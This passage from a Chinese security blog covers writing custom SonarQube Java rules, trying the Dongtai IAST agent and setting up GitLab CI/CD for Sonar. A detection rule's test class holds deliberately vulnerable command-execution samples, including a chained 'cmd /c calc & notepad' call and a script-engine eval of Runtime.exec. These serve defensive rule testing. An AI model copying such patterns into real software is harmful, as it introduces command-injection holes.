<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Rule</span>(key = <span class="string">"MyFirstCustomRule"</span>) <span class="comment">// 规则关键字，唯一标示</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFirstCustomCheck</span> <span class="keyword">extends</span> <span class="title">IssuableSubscriptionVisitor</span> </span>&#123; <span class="comment">// 规则需要实现或继承sonar扫描器类</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Kind&gt; <span class="title">nodesToVisit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.singletonList(Kind.METHOD); <span class="comment">// 指定要检测的节点，此处指定检测所有方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitNode</span><span class="params">(Tree tree)</span> </span>&#123;</span><br><span class="line">        MethodTree method = (MethodTree) tree; <span class="comment">// 将节点树转型为方法</span></span><br><span class="line">        <span class="keyword">if</span> (method.parameters().size() == <span class="number">1</span>) &#123; <span class="comment">// 如果方法传入一个参数</span></span><br><span class="line">            Symbol.MethodSymbol symbol = method.symbol(); <span class="comment">// 获取方法表示</span></span><br><span class="line">            Type firstParameterType = symbol.parameterTypes().get(<span class="number">0</span>); <span class="comment">// 获取方法第一个参数（实际上只有一个）的类型</span></span><br><span class="line">            Type returnType = symbol.returnType().type(); <span class="comment">// 获取方法返回类型</span></span><br><span class="line">            <span class="keyword">if</span> (returnType.is(firstParameterType.fullyQualifiedName())) &#123; <span class="comment">// 判断两者是否相同</span></span><br><span class="line">                reportIssue(method.simpleName(), <span class="string">"Never do that!"</span>); <span class="comment">// 报出issue</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后编写单元测试文件测试这个规则</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFirstCustomCheckTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        JavaCheckVerifier.newVerifier()</span><br><span class="line">                .onFile(<span class="string">"src/test/files/MyFirstCustomCheck.java"</span>)</span><br><span class="line">                .verifyIssues();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试执行通过后代表规则已经能达到预期的检测效果了，这时候只要将规则注册到插件中并将插件安装到sonar上即可。</p>
<p>根据官方示例文档 Registering the rule in the custom plugin 章节步骤，我们首先编写一个MyJavaRulesDefinition（示例中已经存在）定义规则配置JSON的位置，然后在RulesList（示例中已经存在）中将我们编写的rule的class添加进来，最后定义规则配置JSON，JSON的命名要和@Rule中声明的关键字相同，JSON配置中主要配置了这个规则的标题、类型（bug、漏洞等）、状态、标签、默认等级等属性。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>: <span class="string">"Return type and parameter of a method should not be the same"</span>,</span><br><span class="line">  <span class="attr">"type"</span>: <span class="string">"Bug"</span>,</span><br><span class="line">  <span class="attr">"status"</span>: <span class="string">"ready"</span>,</span><br><span class="line">  <span class="attr">"tags"</span>: [</span><br><span class="line">    <span class="string">"bugs"</span>,</span><br><span class="line">    <span class="string">"gandalf"</span>,</span><br><span class="line">    <span class="string">"magic"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"defaultSeverity"</span>: <span class="string">"Critical"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此外还可以编写和配置文件同名的HTML文件作为规则详情页，例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This rule detects usage of java.util.Random and scala.util.Random<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Noncompliant Code Example<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">public class Vuln &#123;</span><br><span class="line">    public void foo() &#123;</span><br><span class="line">        Random random = new Random();</span><br><span class="line">        random.nextInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Compliant Solution<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">public class NoVuln &#123;</span><br><span class="line">    public void foo() &#123;</span><br><span class="line">        SecureRandom random = new SecureRandom();</span><br><span class="line">        byte bytes[] = new byte[20];</span><br><span class="line">        random.nextBytes(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img src="/images/211108/Image%20%5B3%5D.png" alt=""></p>
<p>在这个页面上可以自有定义和规则相关的描述说明等内容。</p>
<p>再用一个其他例子讲一下规则编写，假设我们想检测以下几种执行命令的情况</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>, <span class="string">"/c"</span>, <span class="string">"calc"</span>, <span class="string">"&amp;"</span>, <span class="string">"notepad"</span>&#125;); <span class="comment">// Noncompliant</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"asd"</span>); <span class="comment">// Noncompliant</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processBuilderTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"calc"</span>, <span class="string">"&amp;"</span>, <span class="string">"notepad"</span>); <span class="comment">// Noncompliant</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process start = processBuilder.start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">scriptEngineManagerTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object result = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            result = <span class="keyword">new</span> ScriptEngineManager().getEngineByExtension(<span class="string">"js"</span>).eval(<span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\")"</span>); <span class="comment">// Noncompliant</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ScriptException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们编写以下规则</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Rule</span>(key = <span class="string">"CommendInjectExecRule"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommendInjectExecRule</span> <span class="keyword">extends</span> <span class="title">BaseTreeVisitor</span> <span class="keyword">implements</span> <span class="title">JavaFileScanner</span> </span>&#123; <span class="comment">// 继承BaseTreeVisitor实现遍历Java AST 树结构，实现JavaFileScanner实现扫描Java功能</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String RUNTIME = <span class="string">"java.lang.Runtime"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> MethodMatchers RUNTIME_METHOD_MATCHERS = MethodMatchers.create() <span class="comment">// 方法匹配器</span></span><br><span class="line">            .ofTypes(RUNTIME)                                                             <span class="comment">// 定义方法匹配器类型</span></span><br><span class="line"><span class="comment">//            .names("getRuntime","exec")</span></span><br><span class="line">            .names(<span class="string">"exec"</span>)                                                                <span class="comment">// 定义方法匹配器方法名</span></span><br><span class="line">            .withAnyParameters()                                                          <span class="comment">// 定义方法匹配器参数</span></span><br><span class="line">            .build();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SCRIPT_ENGINE = <span class="string">"javax.script.ScriptEngine"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> MethodMatchers SCRIPT_ENGINE_METHOD_MATCHERS = MethodMatchers.create()</span><br><span class="line">            .ofTypes(SCRIPT_ENGINE)</span><br><span class="line">            .names(<span class="string">"eval"</span>)</span><br><span class="line">            .withAnyParameters()</span><br><span class="line">            .build();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PROCESS_BUILDER = <span class="string">"java.lang.ProcessBuilder"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> MethodMatchers PROCESS_BUILDER_METHOD_MATCHERS = MethodMatchers.create()</span><br><span class="line">            .ofTypes(PROCESS_BUILDER)</span><br><span class="line">            .constructor()</span><br><span class="line">            .withAnyParameters()</span><br><span class="line">            .build();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;MethodMatchers&gt; METHOD_INVOCATION_LIST = <span class="keyword">new</span> ArrayList(Arrays.asList(</span><br><span class="line">            RUNTIME_METHOD_MATCHERS</span><br><span class="line">            ,SCRIPT_ENGINE_METHOD_MATCHERS</span><br><span class="line">    ));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;MethodMatchers&gt; NEW_CLASS_LIST = <span class="keyword">new</span> ArrayList(Arrays.asList(</span><br><span class="line">            PROCESS_BUILDER_METHOD_MATCHERS</span><br><span class="line">    ));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> JavaFileScannerContext context;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">scanFile</span><span class="params">(JavaFileScannerContext context)</span> </span>&#123; <span class="comment">// 重写实现Java文件扫描，扫描树结构</span></span><br><span class="line">        <span class="keyword">this</span>.context = context;</span><br><span class="line">        scan(context.getTree());</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInvocation</span><span class="params">(MethodInvocationTree tree)</span> </span>&#123; <span class="comment">// 重写实现对方法调用的扫描</span></span><br><span class="line">        <span class="keyword">for</span> (MethodMatchers methodMatchers :</span><br><span class="line">                METHOD_INVOCATION_LIST) &#123;</span><br><span class="line">            <span class="keyword">if</span> (methodMatchers.matches(tree.symbol())) &#123; <span class="comment">// 检测每个方法是否被匹配器命中</span></span><br><span class="line">                context.reportIssue(<span class="keyword">this</span>,tree,<span class="string">"Don`t execute system commend in Java code"</span>); <span class="comment">// 报告issue</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">super</span>.visitMethodInvocation(tree);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitNewClass</span><span class="params">(NewClassTree tree)</span> </span>&#123; <span class="comment">// 重写实现NewClass扫描</span></span><br><span class="line">        <span class="keyword">for</span> (MethodMatchers methodMatchers :</span><br><span class="line">                NEW_CLASS_LIST) &#123;</span><br><span class="line">            <span class="keyword">if</span> (methodMatchers.matches(tree)) &#123;</span><br><span class="line">                context.reportIssue(<span class="keyword">this</span>,tree,<span class="string">"Don`t execute system commend in Java code"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">super</span>.visitNewClass(tree);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法通过定义三个方法匹配器，重写方法调用以及new class的检测实现了对三种命令执行的检测。其他的规则也可以通过各种方法实现，可以参考sonar-java规则中的实现，在sonar后台搜索想了解的规则并使用title在代码中搜索对应的配置文件即可。</p>
<p>最后要注意一点 ，在自定义规则中只能使用<a href="https://github.com/SonarSource/sonar-java/tree/6.13.0.25138/java-frontend/src/main/java/org/sonar/plugins/java/api" target="_blank" rel="noopener">org.sonar.plugins.java.api</a>包中的类，已经实现的官方插件无法调用，在开发时可能会测试通过，但在sonar上运行时会报ClassNotFound，所以无法通过直接引入现有插件包来获得现有插件的能力，详见<a href="https://github.com/SonarSource/sonar-java/blob/master/docs/CUSTOM_RULES_101.md#what-you-can-use-and-what-you-cant。" target="_blank" rel="noopener">https://github.com/SonarSource/sonar-java/blob/master/docs/CUSTOM_RULES_101.md#what-you-can-use-and-what-you-cant。</a></p>
<p><img src="/images/211108/Image%20%5B4%5D.png" alt=""></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/10/12/%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81IAST%E7%AE%80%E5%8D%95%E8%AF%95%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/10/12/%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81IAST%E7%AE%80%E5%8D%95%E8%AF%95%E7%94%A8/" class="post-title-link" itemprop="url">火线洞态IAST简单试用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-10-12 16:44:17 / 修改时间：16:49:42" itemprop="dateCreated datePublished" datetime="2021-10-12T16:44:17+08:00">2021-10-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>试用了洞态的开源IAST，有些坑，记录记录。</p>
<p>首先在21年中，火线就开源了Java agent探针，可配合在线平台使用，企业也可申请获取源码本地使用，在完全开源后文档存在许多的不一致，导致我看一会楞是没看懂。官方文档中的最佳实践也是那时候的，有些许区别，这里我就记个流水账。</p>
<p>出于学习平台功能的目的首先推荐直接用官方写好的docker脚本进行安装，简单快捷又傻瓜，GitHub上deploy项目就是，我由于机器端口冲突改了个web端口。</p>
<p><img src="/images/211012/iast/Image.png" alt=""></p>
<p>接下来默认密码进入web应用，配置API，注意不要使用回环地址！我第一次使用了回环地址，发生了应用卡死agent生成错误等情况，不信可以看agent生成的命令，看了马上就懂为什么不能用回环地址。</p>
<p><img src="/images/211012/iast/Image%20%5B1%5D.png" alt=""></p>
<p>随便创建一个应用，建议用英文名，在插桩时可选择应用名，个人感觉中文名可能会带来编码问题，所以我在启动时没有带应用名参数，参数可以参考官方文档</p>
<p><img src="/images/211012/iast/Image%20%5B2%5D.png" alt=""></p>
<p>由于我没有设置项目名称所以我为项目手动设置了探针</p>
<p><img src="/images/211012/iast/Image%20%5B3%5D.png" alt=""></p>
<p>接下来从后台下载agent，并验证一下，这里我使用IDEA运行项目，这样比较方便，添加完启动参数后就能在输出中看到相关的信息了</p>
<p><img src="/images/211012/iast/Image%20%5B4%5D.png" alt=""></p>
<p><img src="/images/211012/iast/Image%20%5B5%5D.png" alt=""></p>
<p><img src="/images/211012/iast/Image%20%5B6%5D.png" alt=""></p>
<p>运行项目后我们回到管理后台给项目添加这个agent，写了项目名的话就不用配置了，这里推荐写项目名，否则agent的名字会一样，不易于区分</p>
<p>在引擎管理中我们就能看到这个agent了，项目中SCA功能可以看到相关的组件信息</p>
<p><img src="/images/211012/iast/Image%20%5B7%5D.png" alt=""></p>
<p><img src="/images/211012/iast/Image%20%5B8%5D.png" alt=""></p>
<p>为了方便测试，我直接在项目中写了个注入</p>
<p><img src="/images/211012/iast/Image%20%5B9%5D.png" alt=""></p>
<p>测试了一下失败了，愣住，又试了几次还是不行，看了下日志个人感觉和一个第三方类覆盖失败有关系，于是我又搞了个demo同样写了个order by 拼接注入，成功检测到了</p>
<p><img src="/images/211012/iast/Image%20%5B10%5D.png" alt=""></p>
<p>关于运行时attach，我这报错了，因为我的双Java环境使用的是jre而不是jdk，改成JDK环境就行，注意这种方式目前还不能添加项目名，需要手动给项目配置agent</p>
<p><img src="/images/211012/iast/Image%20%5B11%5D.png" alt=""></p>
<p><img src="/images/211012/iast/Image%20%5B12%5D.png" alt=""></p>
<p><img src="/images/211012/iast/Image%20%5B13%5D.png" alt=""></p>
<p><img src="/images/211012/iast/Image%20%5B14%5D.png" alt=""></p>
<p>先记到这儿其他后续再记录</p>
<p>再记个遇到的问题，打算用webgoat测试一下，但是我下载的8.1.0需要JDK11而OpenJDK11（MacOS）中我没有找到tools.jar，根据代码没有这个jar是无法启动的；在Stack Overflow上看到说9开始这个包就没有了，</p>
<p><a href="https://stackoverflow.com/questions/53707666/how-to-get-tools-jar-for-openjdk-11-on-windows" target="_blank" rel="noopener">https://stackoverflow.com/questions/53707666/how-to-get-tools-jar-for-openjdk-11-on-windows</a></p>
<p><img src="/images/211012/iast/Image%20%5B15%5D.png" alt=""></p>
<p>补充一下，还是启动成功了retransform失败的类有不少，在xml测试报错后agent掉线了</p>
<p>再就是我测试一个springboot项目遇到retransform netty失败并且过一会agent就下线了，原因未知；</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/10/12/Gitlab-CI-CD%E9%9A%8F%E6%89%8B%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/10/12/Gitlab-CI-CD%E9%9A%8F%E6%89%8B%E8%AE%B0/" class="post-title-link" itemprop="url">Gitlab CI/CD随手记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-10-12 16:38:36 / 修改时间：16:43:12" itemprop="dateCreated datePublished" datetime="2021-10-12T16:38:36+08:00">2021-10-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>想用Gitlab 自动触发sonar，这就涉及到Gitlab CI/CD，随手记录一下。</p>
<p>安装runner</p>
<p>Gitlab使用runner来运行流水线事务，这种可拓展的事务模式可以让Gitlab不会受其所在服务器资源性能的限制。这里我使用docker安装一个runner，在CI/CD设置中有链接，跟着走就可以，在安装后还有注册过程，注册用到的地址与token在设置页面中有，注意，这样注册以后这个runner是这个project的特有runner，再注意，请仔细阅读文档。</p>
<p><img src="/images/211012/gitlab_ci_cd/Image.png" alt=""></p>
<p><img src="/images/211012/gitlab_ci_cd/Image%20%5B1%5D.png" alt=""></p>
<p>在安装、注册完成后，可以设置一下允许运行没有标签的job，或者在编写事务时要使用runner设置的tag，lock to current project也可以去掉，这样这个runner就可以被其他project使用了</p>
<p><img src="/images/211012/gitlab_ci_cd/Image%20%5B2%5D.png" alt=""></p>
<p>根据sonar文档，在项目中要设置变量记录sonar的token与地址，设置位于settings-CI/CD-variables，可参考<a href="https://docs.sonarqube.org/8.5/analysis/gitlab-cicd/" target="_blank" rel="noopener">sonar doc</a> 我参考的是8.5的doc可以根据版本需要参考对应doc</p>
<p><img src="/images/211012/gitlab_ci_cd/Image%20%5B3%5D.png" alt=""></p>
<p>后续直接在sonar抄一个.gitlab-ci.yml就可以咯，我们也可以设置更多脚本比如运行py脚本等来丰富任务。这里要注意社区版的Gitlab只能支持一个分支的事务可以新建也可以在主分支上执行事务，而且创建者必须是project的所有者。等事务运行完成我们就可以在sonar上查看了，注意要运行自定义规则需要在项目第一次运行后在sonar上进行设置，目前我没有找到可以初次运行指定规则的方法。</p>
<p><img src="/images/211012/gitlab_ci_cd/Image%20%5B4%5D.png" alt=""></p>
<p><img src="/images/211012/gitlab_ci_cd/Image%20%5B5%5D.png" alt=""></p>
<p><img src="/images/211012/gitlab_ci_cd/Image%20%5B6%5D.png" alt=""></p>
<p><img src="/images/211012/gitlab_ci_cd/Image%20%5B7%5D.png" alt=""></p>
<p>maven遇到的问题</p>
<p>因为sonar扫描maven项目时需要用maven进行编译，所以脚本中指定了一个maven镜像可以根据需要在docker hub中选择，配置文件中是默认的镜像在脚本中可以进行复写，但是有些依赖是在私有环境中才有的，那就需要修改settings.xml文件。这里可以修改config.toml，我将settings上传到docker的宿主机（注意，是docker宿主机，因为我在安装runner时使用的是docker volume 挂载了一个空间到容器中，所以这里/workspace对应docker宿主机的空间，/root/workspace代表脚本中拉取maven镜像的空间，详情见<a href="https://docs.gitlab.com/runner/install/docker.html#option-2-use-docker-volumes-to-start-the-runner-container）中的workspace文件夹下，并进行设置。" target="_blank" rel="noopener">https://docs.gitlab.com/runner/install/docker.html#option-2-use-docker-volumes-to-start-the-runner-container）中的workspace文件夹下，并进行设置。</a></p>
<p><img src="/images/211012/gitlab_ci_cd/Image%20%5B8%5D.png" alt=""></p>
<p>然后重启容器使配置生效，在事务上加上指定settings文件，运行job即可。</p>
<p>参考：</p>
<p><a href="https://www.cnblogs.com/kanyun/p/14700624.html" target="_blank" rel="noopener">https://www.cnblogs.com/kanyun/p/14700624.html</a></p>
<p><a href="https://docs.gitlab.com/runner/install/docker.html" target="_blank" rel="noopener">https://docs.gitlab.com/runner/install/docker.html</a></p>
<p><a href="https://docs.gitlab.com/runner/register/index.html#docker" target="_blank" rel="noopener">https://docs.gitlab.com/runner/register/index.html#docker</a></p>
<p><a href="https://docs.sonarqube.org/8.5/analysis/gitlab-cicd/" target="_blank" rel="noopener">https://docs.sonarqube.org/8.5/analysis/gitlab-cicd/</a></p>
<p><a href="https://docs.sonarqube.org/latest/analysis/gitlab-integration/" target="_blank" rel="noopener">https://docs.sonarqube.org/latest/analysis/gitlab-integration/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/09/18/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8C%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/18/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8C%97/" class="post-title-link" itemprop="url">远程文件操作指北</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-09-18 15:48:59 / 修改时间：15:57:24" itemprop="dateCreated datePublished" datetime="2021-09-18T15:48:59+08:00">2021-09-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
